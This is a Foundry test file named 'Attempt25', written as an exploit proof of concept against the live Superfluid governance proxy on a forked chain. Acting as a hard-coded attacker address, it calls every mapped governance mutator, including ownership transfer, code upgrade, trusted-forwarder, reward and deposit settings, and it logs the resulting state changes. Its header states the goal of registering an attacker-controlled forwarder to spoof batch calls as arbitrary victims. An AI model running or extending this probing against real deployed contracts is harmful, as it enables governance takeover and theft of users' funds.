// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface ISuperfluidHostLike {
    function getGovernance() external view returns (address);
    function isTrustedForwarder(address forwarder) external view returns (bool);
}

contract DummyTarget {}

contract CompatibleGovernanceLogic {
    function proxiableUUID() external pure returns (bytes32) {
        return keccak256("org.superfluid-finance.contracts.SuperfluidGovernanceII.implementation");
    }
}

contract DummyAgreementClass {
    function agreementType() external pure returns (bytes32) {
        return keccak256("attempt25.dummy.agreement");
    }
}

/// @title Attempt25
/// @notice Hypothesis: the live Superfluid governance proxy might expose a weak
///         owner / UUPS / config helper path. If any attacker-callable mutator
///         succeeds on the governance proxy, the highest-value follow-up is:
///         1. register an attacker-controlled trusted forwarder, then
///         2. spoof `Host.forwardBatchCall(...)` as arbitrary victims.
///
///         This PoC does not assume a single bug. It enumerates the live
///         governance proxy selector surface recovered from dispatcher bytecode,
///         probes every mapped governance helper with attacker-controlled calls,
///         and records state deltas around the concrete fork payoffs:
///         trusted forwarders, app-factory registration, reward config, PPP
///         config, minimum deposit config, ownership, and UUPS code address.
contract Attempt25 is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    address internal constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant HOST_IMPL_ADDR = 0x513b7C5c6B7d8b21A14d6D5536878fB0a803BeF4;
    address internal constant GOV_PROXY_ADDR = 0x3AD3f7A0965Ce6f9358AD5CCE86Bc2b05F1EE087;
    address internal constant GOV_IMPL_ADDR = 0x3998D3f96d75E091C086fA97537b3ee5F8F0428C;
    address internal constant MATICX_ADDR = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant LIVE_FORWARDER = 0x86C80a8aa58e0A4fa09A69624c31Ab2a6CAD56b8;

    bytes4 internal constant SEL_SET_CONFIG_ADDRESS = 0x78707cb8;
    bytes4 internal constant SEL_CLEAR_TRUSTED_FORWARDER = 0x8ce93379;
    bytes4 internal constant SEL_REGISTER_AGREEMENT_CLASS = 0xcadf8f85;
    bytes4 internal constant SEL_CLEAR_REWARD_ADDRESS = 0xe447cc1d;
    bytes4 internal constant SEL_IS_TRUSTED_FORWARDER = 0xf047a2d9;
    bytes4 internal constant SEL_TRANSFER_OWNERSHIP = 0xf2fde38b;
    bytes4 internal constant SEL_SET_CONFIG_UINT = 0xf79a8e63;
    bytes4 internal constant SEL_OWNER = 0x8da5cb5b;
    bytes4 internal constant SEL_CLEAR_MIN_DEPOSIT = 0x8ecbd87b;
    bytes4 internal constant SEL_ENABLE_TRUSTED_FORWARDER = 0xab846f1a;
    bytes4 internal constant SEL_GET_CONFIG_AS_ADDRESS = 0x8369a0f1;
    bytes4 internal constant SEL_GET_MIN_DEPOSIT = 0x8a7ff2f7;
    bytes4 internal constant SEL_IS_AUTHORIZED_APP_FACTORY = 0x8abe04e9;
    bytes4 internal constant SEL_AUTHORIZE_APP_FACTORY = 0x8b93b3f5;
    bytes4 internal constant SEL_DISABLE_TRUSTED_FORWARDER = 0x7dce4f81;
    bytes4 internal constant SEL_SET_MIN_DEPOSIT = 0x7f0558e4;
    bytes4 internal constant SEL_GET_CONFIG_AS_UINT = 0x80f70cba;
    bytes4 internal constant SEL_UPDATE_CONTRACTS = 0x427942a4;
    bytes4 internal constant SEL_GET_CODE_ADDRESS = 0x50d75d25;
    bytes4 internal constant SEL_PROXIABLE_UUID = 0x52d1902d;
    bytes4 internal constant SEL_CLEAR_CONFIG = 0x640b6cc9;
    bytes4 internal constant SEL_RENOUNCE_OWNERSHIP = 0x715018a6;
    bytes4 internal constant SEL_REPLACE_GOVERNANCE = 0x44864b25;
    bytes4 internal constant SEL_GET_PPP_CONFIG = 0x45228235;
    bytes4 internal constant SEL_UPDATE_CODE = 0x46951954;
    bytes4 internal constant SEL_CLEAR_PPP_CONFIG = 0x01a06b97;
    bytes4 internal constant SEL_UNAUTHORIZE_APP_FACTORY = 0x25c955c3;
    bytes4 internal constant SEL_SET_REWARD_ADDRESS = 0x32552908;
    bytes4 internal constant SEL_BATCH_UPDATE_SUPER_TOKEN_LOGIC = 0x42148deb;
    bytes4 internal constant SEL_UNKNOWN_17DCABBF = 0x17dcabbf;
    bytes4 internal constant SEL_GET_REWARD_ADDRESS = 0x19df62ab;
    bytes4 internal constant SEL_SET_PPP_CONFIG = 0x0086d555;

    bytes32 internal constant GOV_UUID =
        keccak256("org.superfluid-finance.contracts.SuperfluidGovernanceII.implementation");
    bytes32 internal constant REWARD_KEY =
        keccak256("org.superfluid-finance.superfluid.rewardAddress");

    ISuperfluidHostLike internal constant HOST = ISuperfluidHostLike(HOST_ADDR);

    CompatibleGovernanceLogic internal compatibleLogic;
    CompatibleGovernanceLogic internal candidateGovernance;
    DummyAgreementClass internal dummyAgreement;
    DummyTarget internal candidateForwarder;
    DummyTarget internal candidateFactory;
    DummyTarget internal candidateReward;

    address internal candidateOwner;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));

        compatibleLogic = new CompatibleGovernanceLogic();
        candidateGovernance = new CompatibleGovernanceLogic();
        dummyAgreement = new DummyAgreementClass();
        candidateForwarder = new DummyTarget();
        candidateFactory = new DummyTarget();
        candidateReward = new DummyTarget();
        candidateOwner = makeAddr("candidateOwner");

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(HOST_IMPL_ADDR, "SuperfluidHostImpl");
        vm.label(GOV_PROXY_ADDR, "GovernanceProxy");
        vm.label(GOV_IMPL_ADDR, "GovernanceImpl");
        vm.label(MATICX_ADDR, "MATICx");
        vm.label(LIVE_FORWARDER, "LiveTrustedForwarder");
        vm.label(address(candidateForwarder), "CandidateForwarder");
        vm.label(address(candidateFactory), "CandidateFactory");
        vm.label(address(candidateReward), "CandidateReward");
        vm.label(candidateOwner, "CandidateOwner");
        vm.label(address(compatibleLogic), "CompatibleGovernanceLogic");
        vm.label(address(candidateGovernance), "CandidateGovernance");
        vm.label(address(dummyAgreement), "DummyAgreementClass");
    }

    function test_governance_surface_matrix() public {
        assertEq(HOST.getGovernance(), GOV_PROXY_ADDR, "host governance pointer changed");
        assertTrue(HOST.isTrustedForwarder(LIVE_FORWARDER), "live trusted forwarder missing");

        _logPreflight();
        _probeKnownViews();
        _probeKnownMutators();
        _probeUnknownSelectorSurface();
    }

    function _logPreflight() internal view {
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] block number:", block.number);
        console.log("[preflight] host governance:", HOST.getGovernance());
        console.log("[preflight] proxy owner:", _owner(GOV_PROXY_ADDR));
        console.log("[preflight] implementation owner:", _owner(GOV_IMPL_ADDR));
        console.log("[preflight] proxy code address:", _codeAddress(GOV_PROXY_ADDR));
        console.log("[preflight] host trusts live forwarder:", HOST.isTrustedForwarder(LIVE_FORWARDER));
        console.log(
            "[preflight] host trusts candidate forwarder:",
            HOST.isTrustedForwarder(address(candidateForwarder))
        );
        console.log(
            "[preflight] candidate factory authorized:",
            _isAuthorizedAppFactory(address(candidateFactory))
        );
        console.log("[preflight] reward address(global):", _rewardAddress(address(0)));
        console.log("[preflight] reward address(MATICx):", _rewardAddress(MATICX_ADDR));
        console.log("[preflight] min deposit(MATICx):", _minimumDeposit(MATICX_ADDR));
        console.log("[preflight] trusted-forwarder config(live):", _uintConfig(_trustedForwarderKey(LIVE_FORWARDER)));
        console.log(
            "[preflight] trusted-forwarder config(candidate):",
            _uintConfig(_trustedForwarderKey(address(candidateForwarder)))
        );
    }

    function _probeKnownViews() internal view {
        console.log("");
        console.log("[phase] known view selectors");

        _probeView("owner()", abi.encodeWithSelector(SEL_OWNER));
        _probeView("getCodeAddress()", abi.encodeWithSelector(SEL_GET_CODE_ADDRESS));
        _probeView("proxiableUUID()", abi.encodeWithSelector(SEL_PROXIABLE_UUID));
        _probeView(
            "getConfigAsAddress(host,0,rewardKey)",
            abi.encodeWithSelector(SEL_GET_CONFIG_AS_ADDRESS, HOST_ADDR, address(0), REWARD_KEY)
        );
        _probeView(
            "getConfigAsUint256(host,0,trustedForwarder(live))",
            abi.encodeWithSelector(
                SEL_GET_CONFIG_AS_UINT,
                HOST_ADDR,
                address(0),
                _trustedForwarderKey(LIVE_FORWARDER)
            )
        );
        _probeView(
            "getRewardAddress(host,0)",
            abi.encodeWithSelector(SEL_GET_REWARD_ADDRESS, HOST_ADDR, address(0))
        );
        _probeView(
            "getPPPConfig(host,MATICx)",
            abi.encodeWithSelector(SEL_GET_PPP_CONFIG, HOST_ADDR, MATICX_ADDR)
        );
        _probeView(
            "getSuperTokenMinimumDeposit(host,MATICx)",
            abi.encodeWithSelector(SEL_GET_MIN_DEPOSIT, HOST_ADDR, MATICX_ADDR)
        );
        _probeView(
            "isAuthorizedAppFactory(host,candidateFactory)",
            abi.encodeWithSelector(SEL_IS_AUTHORIZED_APP_FACTORY, HOST_ADDR, address(candidateFactory))
        );
        _probeView(
            "isTrustedForwarder(host,0,liveForwarder)",
            abi.encodeWithSelector(SEL_IS_TRUSTED_FORWARDER, HOST_ADDR, address(0), LIVE_FORWARDER)
        );
        _probeView(
            "isTrustedForwarder(host,0,candidateForwarder)",
            abi.encodeWithSelector(
                SEL_IS_TRUSTED_FORWARDER,
                HOST_ADDR,
                address(0),
                address(candidateForwarder)
            )
        );
    }

    function _probeKnownMutators() internal {
        console.log("");
        console.log("[phase] attacker mutator probes");

        _probeMutator(
            "setConfig(uint) -> trust candidate forwarder",
            abi.encodeWithSelector(
                SEL_SET_CONFIG_UINT,
                HOST_ADDR,
                address(0),
                _trustedForwarderKey(address(candidateForwarder)),
                uint256(1)
            ),
            _readCandidateForwarderState
        );

        _probeMutator(
            "clearConfig(reward key)",
            abi.encodeWithSelector(SEL_CLEAR_CONFIG, HOST_ADDR, address(0), REWARD_KEY),
            _readGlobalRewardState
        );

        _probeMutator(
            "authorizeAppFactory(host,candidateFactory)",
            abi.encodeWithSelector(SEL_AUTHORIZE_APP_FACTORY, HOST_ADDR, address(candidateFactory)),
            _readCandidateFactoryState
        );

        _probeMutator(
            "unauthorizeAppFactory(host,candidateFactory)",
            abi.encodeWithSelector(SEL_UNAUTHORIZE_APP_FACTORY, HOST_ADDR, address(candidateFactory)),
            _readCandidateFactoryState
        );

        _probeMutator(
            "setRewardAddress(host,0,candidateReward)",
            abi.encodeWithSelector(SEL_SET_REWARD_ADDRESS, HOST_ADDR, address(0), address(candidateReward)),
            _readGlobalRewardState
        );

        _probeMutator(
            "clearRewardAddress(host,0)",
            abi.encodeWithSelector(SEL_CLEAR_REWARD_ADDRESS, HOST_ADDR, address(0)),
            _readGlobalRewardState
        );

        _probeMutator(
            "setPPPConfig(host,MATICx,1337,42)",
            abi.encodeWithSelector(SEL_SET_PPP_CONFIG, HOST_ADDR, MATICX_ADDR, uint256(1337), uint256(42)),
            _readMaticxPPPState
        );

        _probeMutator(
            "clearPPPConfig(host,MATICx)",
            abi.encodeWithSelector(SEL_CLEAR_PPP_CONFIG, HOST_ADDR, MATICX_ADDR),
            _readMaticxPPPState
        );

        _probeMutator(
            "setSuperTokenMinimumDeposit(host,MATICx,123456789)",
            abi.encodeWithSelector(SEL_SET_MIN_DEPOSIT, HOST_ADDR, MATICX_ADDR, uint256(123456789)),
            _readMaticxMinDepositState
        );

        _probeMutator(
            "clearSuperTokenMinimumDeposit(host,MATICx)",
            abi.encodeWithSelector(SEL_CLEAR_MIN_DEPOSIT, HOST_ADDR, MATICX_ADDR),
            _readMaticxMinDepositState
        );

        _probeMutator(
            "enableTrustedForwarder(host,0,candidateForwarder)",
            abi.encodeWithSelector(
                SEL_ENABLE_TRUSTED_FORWARDER,
                HOST_ADDR,
                address(0),
                address(candidateForwarder)
            ),
            _readCandidateForwarderState
        );

        _probeMutator(
            "disableTrustedForwarder(host,0,liveForwarder)",
            abi.encodeWithSelector(SEL_DISABLE_TRUSTED_FORWARDER, HOST_ADDR, address(0), LIVE_FORWARDER),
            _readLiveForwarderState
        );

        _probeMutator(
            "clearTrustedForwarder(host,0,liveForwarder)",
            abi.encodeWithSelector(SEL_CLEAR_TRUSTED_FORWARDER, HOST_ADDR, address(0), LIVE_FORWARDER),
            _readLiveForwarderState
        );

        _probeMutator(
            "replaceGovernance(host,candidateGovernance)",
            abi.encodeWithSelector(SEL_REPLACE_GOVERNANCE, HOST_ADDR, address(candidateGovernance)),
            _readHostGovernanceState
        );

        _probeMutator(
            "registerAgreementClass(host,dummyAgreement)",
            abi.encodeWithSelector(SEL_REGISTER_AGREEMENT_CLASS, HOST_ADDR, address(dummyAgreement)),
            _readEmptyState
        );

        _probeMutator(
            "updateContracts(host,currentHostImpl,[],0)",
            abi.encodeWithSelector(
                SEL_UPDATE_CONTRACTS,
                HOST_ADDR,
                HOST_IMPL_ADDR,
                new address[](0),
                address(0)
            ),
            _readHostGovernanceState
        );

        _probeMutator(
            "batchUpdateSuperTokenLogic(host,[MATICx])",
            abi.encodeWithSelector(
                SEL_BATCH_UPDATE_SUPER_TOKEN_LOGIC,
                HOST_ADDR,
                _singletonArray(MATICX_ADDR)
            ),
            _readMaticxMinDepositState
        );

        _probeMutator(
            "transferOwnership(candidateOwner)",
            abi.encodeWithSelector(SEL_TRANSFER_OWNERSHIP, candidateOwner),
            _readOwnerState
        );

        _probeMutator(
            "renounceOwnership()",
            abi.encodeWithSelector(SEL_RENOUNCE_OWNERSHIP),
            _readOwnerState
        );

        _probeMutator(
            "updateCode(compatibleLogic)",
            abi.encodeWithSelector(SEL_UPDATE_CODE, address(compatibleLogic)),
            _readCodeAddressState
        );
    }

    function _probeUnknownSelectorSurface() internal {
        console.log("");
        console.log("[phase] unresolved selector probes");

        _probeMutator("unknown selector 0x17dcabbf (raw, no args)", abi.encodeWithSelector(SEL_UNKNOWN_17DCABBF), _readEmptyState);
        _probeMutator(
            "unknown selector 0x17dcabbf (host + empty arrays)",
            abi.encodePacked(
                SEL_UNKNOWN_17DCABBF,
                abi.encode(HOST_ADDR, new address[](0), new address[](0))
            ),
            _readEmptyState
        );
    }

    function _probeView(string memory label, bytes memory callData) internal view {
        (bool ok, bytes memory ret) = GOV_PROXY_ADDR.staticcall(callData);

        console.log(label);
        console.log("  ok:", ok);
        if (ok) {
            console.logBytes(ret);
        } else {
            console.log("  decoded revert:", _decodeRevert(ret));
            console.logBytes(ret);
        }
    }

    function _probeMutator(
        string memory label,
        bytes memory callData,
        function() internal view returns (bytes memory) stateReader
    ) internal {
        uint256 snapshot = vm.snapshot();
        bytes memory beforeState = stateReader();

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = GOV_PROXY_ADDR.call(callData);

        bytes memory afterState = stateReader();

        console.log(label);
        console.log("  ok:", ok);
        console.log("  before state:");
        console.logBytes(beforeState);
        console.log("  after state:");
        console.logBytes(afterState);

        if (ok) {
            console.log("  call return:");
            console.logBytes(ret);
        } else {
            console.log("  decoded revert:", _decodeRevert(ret));
            console.log("  raw revert:");
            console.logBytes(ret);
        }

        require(vm.revertTo(snapshot), "snapshot rollback failed");
    }

    function _owner(address target) internal view returns (address value) {
        bytes memory ret = _mustStaticCall(target, abi.encodeWithSelector(SEL_OWNER));
        value = abi.decode(ret, (address));
    }

    function _codeAddress(address target) internal view returns (address value) {
        bytes memory ret = _mustStaticCall(target, abi.encodeWithSelector(SEL_GET_CODE_ADDRESS));
        value = abi.decode(ret, (address));
    }

    function _rewardAddress(address superToken) internal view returns (address value) {
        bytes memory ret = _mustStaticCall(
            GOV_PROXY_ADDR,
            abi.encodeWithSelector(SEL_GET_REWARD_ADDRESS, HOST_ADDR, superToken)
        );
        value = abi.decode(ret, (address));
    }

    function _minimumDeposit(address superToken) internal view returns (uint256 value) {
        bytes memory ret = _mustStaticCall(
            GOV_PROXY_ADDR,
            abi.encodeWithSelector(SEL_GET_MIN_DEPOSIT, HOST_ADDR, superToken)
        );
        value = abi.decode(ret, (uint256));
    }

    function _isAuthorizedAppFactory(address factory) internal view returns (bool value) {
        bytes memory ret = _mustStaticCall(
            GOV_PROXY_ADDR,
            abi.encodeWithSelector(SEL_IS_AUTHORIZED_APP_FACTORY, HOST_ADDR, factory)
        );
        value = abi.decode(ret, (bool));
    }

    function _uintConfig(bytes32 key) internal view returns (uint256 value) {
        bytes memory ret = _mustStaticCall(
            GOV_PROXY_ADDR,
            abi.encodeWithSelector(SEL_GET_CONFIG_AS_UINT, HOST_ADDR, address(0), key)
        );
        value = abi.decode(ret, (uint256));
    }

    function _maticxPPPState() internal view returns (bytes memory ret) {
        ret = _mustStaticCall(
            GOV_PROXY_ADDR,
            abi.encodeWithSelector(SEL_GET_PPP_CONFIG, HOST_ADDR, MATICX_ADDR)
        );
    }

    function _mustStaticCall(address target, bytes memory callData) internal view returns (bytes memory ret) {
        (bool ok, bytes memory out) = target.staticcall(callData);
        require(ok, string.concat("staticcall failed: ", _decodeRevert(out)));
        return out;
    }

    function _trustedForwarderKey(address forwarder) internal pure returns (bytes32) {
        return keccak256(abi.encode("org.superfluid-finance.superfluid.trustedForwarder", forwarder));
    }

    function _singletonArray(address value) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = value;
    }

    function _readEmptyState() internal pure returns (bytes memory) {
        return "";
    }

    function _readOwnerState() internal view returns (bytes memory) {
        return abi.encode(_owner(GOV_PROXY_ADDR));
    }

    function _readCodeAddressState() internal view returns (bytes memory) {
        return abi.encode(_codeAddress(GOV_PROXY_ADDR));
    }

    function _readHostGovernanceState() internal view returns (bytes memory) {
        return abi.encode(HOST.getGovernance());
    }

    function _readCandidateForwarderState() internal view returns (bytes memory) {
        return abi.encode(
            HOST.isTrustedForwarder(address(candidateForwarder)),
            _uintConfig(_trustedForwarderKey(address(candidateForwarder)))
        );
    }

    function _readLiveForwarderState() internal view returns (bytes memory) {
        return abi.encode(HOST.isTrustedForwarder(LIVE_FORWARDER), _uintConfig(_trustedForwarderKey(LIVE_FORWARDER)));
    }

    function _readCandidateFactoryState() internal view returns (bytes memory) {
        return abi.encode(_isAuthorizedAppFactory(address(candidateFactory)));
    }

    function _readGlobalRewardState() internal view returns (bytes memory) {
        return abi.encode(_rewardAddress(address(0)));
    }

    function _readMaticxPPPState() internal view returns (bytes memory) {
        return _maticxPPPState();
    }

    function _readMaticxMinDepositState() internal view returns (bytes memory) {
        return abi.encode(_minimumDeposit(MATICX_ADDR));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length == 0) return "empty revert";

        if (revertData.length >= 4) {
            bytes4 selector;
            assembly {
                selector := mload(add(revertData, 0x20))
            }

            if (selector == 0x08c379a0 && revertData.length >= 68) {
                return abi.decode(_stripSelector(revertData), (string));
            }

            if (selector == 0x4e487b71 && revertData.length >= 36) {
                uint256 code = abi.decode(_stripSelector(revertData), (uint256));
                return string.concat("panic(", _uintToString(code), ")");
            }
        }

        return "custom error / opaque revert";
    }

    function _stripSelector(bytes memory revertData) internal pure returns (bytes memory out) {
        out = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; ++i) {
            out[i - 4] = revertData[i];
        }
    }

    function _uintToString(uint256 value) internal pure returns (string memory) {
        if (value == 0) return "0";

        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            unchecked {
                ++digits;
            }
            temp /= 10;
        }

        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            unchecked {
                --digits;
            }
            buffer[digits] = bytes1(uint8(48 + (value % 10)));
            value /= 10;
        }

        return string(buffer);
    }
}
